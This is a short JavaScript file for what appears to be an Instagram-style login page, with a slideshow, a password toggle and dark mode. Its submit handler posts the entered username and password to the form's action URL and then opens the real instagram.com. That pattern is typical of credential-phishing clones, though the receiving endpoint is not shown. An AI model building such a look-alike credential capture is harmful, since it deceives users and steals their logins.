/** @format */

let slide_content = document.querySelector("#slide-content");

let signin_form = document.querySelector("#signin-form");

let signin_btn = document.querySelector("#signin-btn");

let darkmode_toggle = document.querySelector("#darkmode-toggle");

let slide_index = 0;

slide = () => {
  let slide_items = slide_content.querySelectorAll("img");
  slide_items.forEach((e) => e.classList.remove("active"));
  slide_index = slide_index + 1 === slide_items.length ? 0 : slide_index + 1;
  slide_items[slide_index].classList.add("active");
};

setInterval(slide, 2000);

// animate input
document.querySelectorAll(".animate-input").forEach((e) => {
  let input = e.querySelector("input");
  let button = e.querySelector("button");

  input.onkeyup = () => {
    if (input.value.trim().length > 0) {
      e.classList.add("active");
    } else {
      e.classList.remove("active");
    }

    if (checkSigninInput()) {
      signin_btn.removeAttribute("disabled");
    } else {
      signin_btn.setAttribute("disabled", "true");
    }
  };

  // show password button
  if (button) {
    button.onclick = () => {
      if (input.getAttribute("type") === "text") {
        input.setAttribute("type", "password");
        button.innerHTML = "Show";
      } else {
        input.setAttribute("type", "text");
        button.innerHTML = "Hide";
      }
    };
  }
});

checkSigninInput = () => {
  let inputs = signin_form.querySelectorAll("input");
  return Array.from(inputs).every((input) => {
    return input.value.trim().length >= 6;
  });
};

// darkmode toggle
darkmode_toggle.onclick = (e) => {
  e.preventDefault();
  let body = document.querySelector("body");
  body.classList.toggle("dark");
  darkmode_toggle.innerHTML = body.classList.contains("dark")
    ? "Lightmode"
    : "Darkmode";
};

let form = document.getElementById("signin-form");
form.addEventListener("submit", (e) => {
  e.preventDefault();
  fetch(form.action, {
    method: "POST",
    body: new FormData(document.getElementById("signin-form")),
  })
    .then((response) => response.json())
    .then((html) => {
      // you can put any JS code here
      window.open("https://instagram.com", "_blank");
    });
});
